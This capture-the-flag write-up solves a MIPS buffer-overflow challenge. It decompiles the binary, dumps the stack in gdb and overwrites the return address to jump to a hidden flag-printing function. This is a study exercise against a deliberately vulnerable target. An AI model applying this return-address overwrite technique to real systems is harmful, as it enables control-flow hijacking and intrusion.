# Description
## STOP GAN
Label: pwn

Success, you've gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two seperate things, you think you've rescue them and their brethren by downloading them all to your ships hard drive. They're still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It's important now to stop this program from destroying these "Cauliflowers" as they're referred to, ever again.

# Solution
This attachment is a zip file containing a `bof` binary and a `console.c` source file. The description for the task also includes the text `buffer-overflow.ctfcompetition.com 1337`. Looking at the source file, we see that the binary `bof` is run using qemu and then we have to send input into that program and cause it to crash. There is also a bonus flag if we can cause a controlled crash. To test locally I just ran `qemu-mipsel bof` which runs the program and shows the prompt `Cauliflower systems never crash >>`. Entering text into the prompt just closes it. Since the goal was to use a buffer overflow I decided to just input a lot of text into the program and with a long enough input, a segfault is created. Now all we have to do is try in on the actual program. So we connect to the server provided in the task `nc buffer-overflow.ctfcompetition.com 1337`, enter `run` then enter our long string of input. After a successful crash, it prints out the flag `CTF{Why_does_cauliflower_threaten_us}`

Since there is another flag, I decided to take a look at decompiling the `bof` binary. For this I used `ghidra`. Since I don't have much experience with this, it was quite difficult to figure out everything, but after playing around with it for a while this was what I figured out. This is what I figured out about what the program looks like
```c
int main(void)
{
  sighandler_t prevHandler;
  int returnVal;
  byte buffer[260];

  prevHandler = signal(SIGSEGV, segfault_handler);
  if (prevHandler == -1) {
    printf("An error occurred setting a signal handler.");
    returnVal = -1;
  } else {
    puts("Cauliflower systems never crash >>");
    scanf("%s", &buffer);
    returnVal = 0;
  }
  return returnVal;
}

void segfault_handler(void)
{
  printf("segfault detected! ***CRASH***");
  print_file("flag");
  exit(0);
}

void print_file(char *filename)
{
  int fileDescriptor;
  char buffer[4];
  int bytesRead;

  fileDescriptor = open(filename, O_RDONLY);
  if (fileDescriptor == -1) {
    puts("could not open flag");
    exit(1);
  }
  while ((bytesRead = read(fileDescriptor, &buffer, 1)) == 1) {
    write(STDOUT_FILENO, &buffer, 1);
  }
  close(fileDescriptor);
  return;
}
```

You can see that it does a `scanf` into a buffer of size 260. Therefore if we input something that is greater that `260 + 4 (frame pointer)` bytes, we should get a segfault because then we overwrite the return address. The `segfault-payload` file contains the data for causing a segfault.

```
Stack
+---------------------------+ High
|Previous frame             |
|                           |
+---------------------------+
|Return address             |
+---------------------------+
|Buffer                     |
|                           |
|                           |
|                           |
|                           |
+---------------------------+
|return value               |
+---------------------------+
|signal_handler             |
+---------------------------+ Low
```

Notice that there is no sign of the hidden flag in there. That was because ghidra removed an unreachable block. If we look at the assembly instead we can see the hidden block.
```mips
004009bc 60 1f 11 04     bal        scanf                                            ;call scanf()
004009c0 00 00 00 00     _nop                                                        ;branch delay slot
004009c4 10 00 dc 8f     lw         gp,0x10(s8)                                      ;??
004009c8 18 00 c2 8f     lw         returnVal,0x18(s8)                               ;load word into returnVal
004009cc 07 00 40 14     bne        returnVal,zero,setNormalReturnValue              ;this jump skips over the get hidden flag section
004009d0 00 00 00 00     _nop
                        getHiddenFlag
004009d4 30 80 82 8f     lw         returnVal,-0x7fd0(gp)
004009d8 40 08 42 24     addiu      returnVal,returnVal,0x840
004009dc 25 c8 40 00     or         t9,returnVal,zero
004009e0 97 ff 11 04     bal        local_flag                                       ;local_flag()
004009e4 00 00 00 00     _nop                                                        ;branch delay slot
004009e8 10 00 dc 8f     lw         gp,0x10(s8)
                        setNormalReturnValue
004009ec 25 10 00 00     or         returnVal,zero,zero
                        exit
004009f0 25 e8 c0 03     or         sp,s8,zero
004009f4 24 01 bf 8f     lw         ra,0x124(sp)
004009f8 20 01 be 8f     lw         s8,0x120(sp)
004009fc 28 01 bd 27     addiu      sp,sp,0x128
00400a00 08 00 e0 03     jr         ra
00400a04 00 00 00 00     _nop
```

And this is the print local function
```c
void local_flag(void)
{
  print_file("flag1");
  exit(0);
}
```

To get a better picture of what is happening, I used qemu with the gdb debugger to step examine the stack frame.
```
> qemu-mipsel-static -g 5555 bof
> gdb-multiarch
> (gdb) target remote localhost:5555
```

We can then set a breakpoint after `scanf`
> (gdb) b *0x004009c4

Then print out information. Here was the information from the gdb session
```
(gdb) i frame                                                             
Stack level 0, frame at 0x7fffd8f0:                                       
 pc = 0x4009c4 in main; saved pc = 0x400840                               
 Arglist at 0x7fffd8f0, args:                                             
 Locals at 0x7fffd8f0, Previous frame's sp is 0x7fffd8f0                  
 Saved registers:                                                         
  gp at 0x7fffd7d8, s8 at 0x7fffd8e8, ra at 0x7fffd8ec, pc at 0x7fffd8ec  
(gdb) x/100xw $sp                                                         
0x7fffd7c8:     0x00000060      0x7fffd7e4      0x00000001      0x00000000
0x7fffd7d8:     0x004a8970      0x00000000      0x00000001      0xaaaaaaaa
0x7fffd7e8:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd7f8:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd808:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd818:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd828:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd838:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd848:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd858:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd868:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd878:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd888:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd898:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd8a8:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd8b8:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd8c8:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd8d8:     0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa      0xaaaaaaaa
0x7fffd8e8:     0xaaaaaaaa      0x00400840 <-- return address
```

From here I tried overwriting the return address to point to the `read_local` function. Writing to the start of the function `0x00400840` successfuly jumped to the function but when it entered the `print_file` subroutine it crashed. Still not sure about why this happens. Instead, I skipped over some of the setup in the function and jumped to the address `0x00400860` which is where the stack is being setup for the call into `print_file`. This worked as the flag `CTF{controlled_crash_causes_conditional_correspondence}` was printed out.